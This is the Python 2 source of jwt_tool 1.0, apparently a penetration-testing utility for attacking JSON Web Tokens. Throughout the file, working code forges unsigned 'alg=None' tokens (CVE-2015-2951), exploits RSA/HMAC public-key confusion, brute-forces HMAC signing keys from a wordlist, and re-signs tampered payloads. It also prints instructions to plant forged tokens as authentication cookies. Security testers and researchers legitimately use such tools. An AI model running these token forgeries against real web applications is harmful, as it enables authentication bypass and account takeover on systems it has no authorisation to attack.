#! /usr/bin/python

#
# JWT_Tool version 1.0 (02_07_2017)
# Written by ticarpi
# Please use responsibly...
# Software URL: https://github.com/ticarpi/jwt_tool
# Web: https://www.ticarpi.com
# Twitter: @ticarpi
#

import sys
import hashlib
import hmac
import base64
import json
from collections import OrderedDict

def usage():
	print "Usage: $ python jwt_tool.py <JWT> (dictionary filename)"
	print "If you don't have a token, try this one:"
	print "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw"
	exit(1)

def checkSig(sig, contents):
	quiet = False
	print "Type in the key to test"
	key = raw_input("> ")
	testKey(key, sig, contents, headDict, quiet)

def crackSig(sig, contents):
	quiet = True
	print "\nLoading key dictionary..."
	print "File loaded: "+keyList
	print "Testing "+str(numLines)+" passwords..."
	for i in keyLst:
		testKey(i, sig, contents, headDict, quiet)

def testKey(key, sig, contents, headDict, quiet):
	if headDict["alg"] == "HS256":
		testSig = base64.b64encode(hmac.new(key,contents,hashlib.sha256).digest()).strip("=")
	elif headDict["alg"] == "HS384":
		testSig = base64.b64encode(hmac.new(key,contents,hashlib.sha384).digest()).strip("=")
	elif headDict["alg"] == "HS512":
		testSig = base64.b64encode(hmac.new(key,contents,hashlib.sha512).digest()).strip("=")
	else:
		print "Algorithm is not HMAC-SHA - cannot test with this tool."
		exit(1)
	if testSig == sig:
		print "[+] "+key+" is the CORRECT key!"
		exit(1)
	else:
		if quiet == False:
			print "[-] "+key+" is not the correct key"
		return

def buildHead(alg, headDict):
	newHead = headDict
	newHead["alg"] = alg
	newHead = base64.b64encode(json.dumps(newHead,separators=(",",":"))).strip("=")
	return newHead

def signToken(headDict, paylDict, key, keyLength):
	newHead = headDict
	newHead["alg"] = "HS"+str(keyLength)
	print newHead
	print keyLength
	if keyLength == 384:
		newContents = base64.b64encode(json.dumps(newHead,separators=(",",":"))).strip("=")+"."+base64.b64encode(json.dumps(paylDict,separators=(",",":"))).strip("=")
		newSig = base64.b64encode(hmac.new(key,newContents,hashlib.sha384).digest()).strip("=")
		print "did 384"
	elif keyLength == 512:
		newContents = base64.b64encode(json.dumps(newHead,separators=(",",":"))).strip("=")+"."+base64.b64encode(json.dumps(paylDict,separators=(",",":"))).strip("=")
		newSig = base64.b64encode(hmac.new(key,newContents,hashlib.sha512).digest()).strip("=")
		print "did 512"
	else:
		newContents = base64.b64encode(json.dumps(newHead,separators=(",",":"))).strip("=")+"."+base64.b64encode(json.dumps(paylDict,separators=(",",":"))).strip("=")
		newSig = base64.b64encode(hmac.new(key,newContents,hashlib.sha256).digest()).strip("=")
		print "did 256"
	return newSig, newContents

def checkCVE(headDict, tok2):
	print "\nGenerating alg-stripped token..."
	alg = "None"
	newHead = buildHead(alg, headDict)
	CVEToken = newHead+"."+tok2+"."
	print "\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)"
	print "\n"+CVEToken+"\n"

def checkPubKey(headDict, tok2):
	print "\nPlease enter the Public Key filename:"
	pubKey = raw_input("> ")
	key = open(pubKey).read()
	newHead = headDict
	newHead["alg"] = "HS256"
	print tok2
	newHead = base64.b64encode(json.dumps(headDict,separators=(",",":"))).strip("=")
	newTok = newHead+"."+tok2
	newSig = base64.b64encode(hmac.new(key,newTok,hashlib.sha256).digest()).strip("=")
	print "\nSet this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).\n(This will only be valid on unpatched implementations of JWT.)"
	print "\n"+newTok+"."+newSig

def tamperToken(paylDict, headDict):
	print "\nToken payload values:"
	while True:
		i = 0
		paylList = [0]
		for pair in paylDict:
			menuNum = i+1
			print "["+str(menuNum)+"] "+pair+" = "+str(paylDict[pair])
			paylList.append(pair)
			i += 1
		print "[0] Continue to next step"
		selection = ""
		print "\nPlease select a field number:\n(or 0 to Continue)"
		selection = input("> ")
		if selection<len(paylList) and selection>0:
			print "\nCurrent value of "+paylList[selection]+" is: "+str(paylDict[paylList[selection]])
			print "Please enter new value and hit ENTER"
			newVal = raw_input("> ")
			paylDict[paylList[selection]] = newVal
		elif selection == 0:
			break
		else:
			exit(1)
	print "\nToken Signing:"
	print "[1] Sign token with known key"
	print "[2] Strip signature from token vulnerable to CVE-2015-2951"
	print "[3] Sign with Public Key bypass vulnerability"
	print "\nPlease select an option from above (1-3):"
	selection = input("> ")
	if selection == 1:
		print "\nPlease enter the known key:"
		key = raw_input("> ")
		print "\nPlease enter the keylength:"
		print "[1] HMAC-SHA256"
		print "[2] HMAC-SHA384"
		print "[3] HMAC-SHA512"
		selLength = raw_input("> ")
		if selLength == "2":
			keyLength = 384	
		elif selLength == "3":
			keyLength = 512
		else:
			keyLength = 256
		newSig, newContents = signToken(headDict, paylDict, key, keyLength)
		print "\nYour new forged token:"
		print newContents+"."+newSig+"\n"
		exit(1)
	elif selection == 2:
		print "\nStripped Signature"
		tok2 = base64.b64encode(json.dumps(paylDict,separators=(",",":"))).strip("=")
		checkCVE(headDict, tok2)
		exit(1)
	elif selection == 3:
		tok2 = base64.b64encode(json.dumps(paylDict,separators=(",",":"))).strip("=")
		checkPubKey(headDict, tok2)
		exit(1)
	else:
		exit(1)


if __name__ == '__main__':
# Print logo
	print "\n,----.,----.,----.,----.,----.,----.,----.,----.,----.,----."
	print "----''----''----''----''----''----''----''----''----''----'"
	print "     ,--.,--.   ,--.,--------.,--------.             ,--."
	print "     |  ||  |   |  |'--.  .--''--.  .--',---.  ,---. |  |"
	print ",--. |  ||  |.'.|  |   |  |      |  |  | .-. || .-. ||  |"
	print "|  '-'  /|   ,'.   |   |  |,----.|  |  ' '-' '' '-' '|  |"
	print " `-----' '--'   '--'   `--''----'`--'   `---'  `---' `--'"
	print ",----.,----.,----.,----.,----.,----.,----.,----.,----.,----."
	print "'----''----''----''----''----''----''----''----''----''----'"

# Print usage + check token validity
	if len(sys.argv) < 2:
		usage()

# Temporary variables
	jwt = sys.argv[1]
	key = ""
	if len(sys.argv) == 3:
		keyList = sys.argv[2]
		numLines = sum(1 for line in open(keyList) if line.rstrip())
		with open(keyList, "r") as f:
		    keyLst = f.readlines()
		keyLst = [x.strip() for x in keyLst]
	else:
		keyList = ""

# Rejig token
	try:
		tok1, tok2, sig = jwt.split(".",3)
		contents = tok1+"."+tok2
		head = base64.b64decode(tok1 + "=" * (-len(tok1) % 4))
		payl = base64.b64decode(tok2 + "=" * (-len(tok2) % 4))
		headDict = json.loads(head, object_pairs_hook=OrderedDict)
		paylDict = json.loads(payl, object_pairs_hook=OrderedDict)
	except:
		print "Oh noes! Invalid token"
		exit(1)

# Main menu
	print "\nToken header values:"
	for i in headDict:
  		print "[+] "+i+" = "+str(headDict[i])
	print "\nToken payload values:"
	for i in paylDict:
  		print "[+] "+i+" = "+str(paylDict[i])
	print "\n######################################################"
	print "# Options:                                           #"
	print "# 1: Check CVE-2015-2951 - alg=None vulnerability    #"
	print "# 2: Check for Public Key bypass in RSA mode         #"
	print "# 3: Check signature against a key                   #"
	print "# 4: Crack signature with supplied dictionary file   #"
	print "# 5: Tamper with payload data (key required to sign) #"
	print "# 0: Quit                                            #"
	print "######################################################"
	print "\nPlease make a selection (1-5)"
	selection = input("> ")
	if selection == 1:
		checkCVE(headDict, tok2)
	elif selection == 2:
		checkPubKey(headDict, tok2)
	elif selection == 3:
		checkSig(sig, contents)
	elif selection == 4:
		if keyList != "":
			crackSig(sig, contents)
		else:
			print "No dictionary file provided."
			usage()
	elif selection == 5:
		tamperToken(paylDict, headDict)
	else:
		exit(1)
	exit(1)

	
